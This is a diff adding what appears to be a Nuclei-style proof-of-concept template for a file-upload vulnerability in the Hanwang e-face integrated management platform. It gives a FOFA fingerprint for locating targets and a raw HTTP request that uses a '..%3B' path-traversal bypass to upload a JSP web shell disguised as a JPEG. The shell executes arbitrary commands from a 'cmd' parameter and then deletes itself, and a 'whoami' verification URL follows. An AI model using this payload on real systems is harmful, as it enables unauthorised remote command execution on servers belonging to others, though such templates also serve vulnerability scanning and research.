@@ -1,0 +1,49 @@
+id: poc-ikotoba4wc7iymf2
+info:
+  name: 汉王e脸通综合管理平台 uploadMeetingFile.do文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ikotoba4wc7iymf2'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ikotoba4wc7iymf2
+    fofa: icon_hash="1380907357"
+http:
+- raw:
+  - 'POST /manage/intercom/..%3B/..%3B/manage/meetingPersonal/uploadMeetingFile.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1750483690340-4c5019a7-d5e9-4783-b9e9-cabe578a48b5.png)
+
+    验证路径
+
+    /manage/resource/f82b8187d13c4d699a879e77fac82017.jsp?cmd=whoami'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
